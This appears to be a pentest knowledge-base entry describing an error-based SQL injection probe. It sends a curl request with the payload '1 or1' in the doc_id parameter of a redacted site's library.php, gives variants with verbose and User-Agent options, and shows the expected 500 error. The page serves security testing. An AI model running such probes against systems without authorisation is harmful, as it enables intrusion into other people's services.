---
data: 'curl -X GET "https://████/library.php?path=test&doc_id=1 or1" -v'
tags:
  - error-based
  - sqli
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.216Z'
id: fdf6a564-80a1-4ee0-8906-47d90dc910d3
verified: false
validated: true
submitted: true
---
# sqli-error-based-or1-test

## Command

```bash
curl -X GET "https://████/library.php?path=test&doc_id=1 or1" -v
```

## Description

Tests error-based SQLi with a malformed OR payload to trigger a 500 error revealing injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| doc_id | '1 or1' payload (no space) | Yes |
| -v | Verbose for error details | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://████/library.php?path=test&doc_id=1 or1" -v
```

### Advanced Usage

```bash
curl -X GET "https://████/library.php?path=test&doc_id=1 or1" -v --header "User-Agent: Mozilla/5.0"
```

## Expected Output

HTTP/1.1 500 Internal Server Error with body: <html><body><b>Error 500: Internal Server Error</b><br>doc_id 1 or1 not found.</body></html>

## Related

- [[procedures/Confirm-SQLi-with-Error-Based-Payloads]]
